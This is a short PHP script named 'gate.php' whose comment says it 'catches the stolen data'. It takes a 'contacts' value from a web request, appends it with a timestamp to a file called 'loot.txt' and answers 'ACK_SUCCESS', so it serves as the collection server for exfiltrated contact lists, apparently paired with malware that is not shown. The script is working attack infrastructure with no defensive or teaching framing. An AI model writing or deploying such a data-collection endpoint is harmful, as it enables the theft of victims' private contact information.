<?php
// gate.php - This catches the stolen data
if (isset($_GET['contacts'])) {
    $data = $_GET['contacts'];
    $file = fopen("loot.txt", "a");
    fwrite($file, "[" . date('H:i:s') . "] RECEIVED: " . $data . "\n");
    fclose($file);
    echo "ACK_SUCCESS"; 
}
?>
